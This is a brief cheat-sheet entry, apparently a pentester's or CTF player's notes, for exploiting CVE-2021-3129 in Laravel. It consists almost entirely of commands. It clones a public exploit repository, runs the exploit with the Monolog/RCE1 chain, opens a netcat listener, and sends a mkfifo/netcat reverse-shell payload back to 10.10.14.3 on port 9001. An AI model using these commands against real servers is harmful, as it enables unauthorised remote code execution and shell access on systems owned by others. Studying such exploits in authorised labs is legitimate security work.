# Laravel

```
git clone https://github.com/nth347/CVE-2021-3129_exploit.git
cd CVE-2021-3129_exploit
chmod +x exploit.py
```

```
./exploit.py http://localhost:8000 Monolog/RCE1 id
```

```
nc -lvnp 9001
```

```
./exploit.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat
/tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9001 >/tmp/f'
```
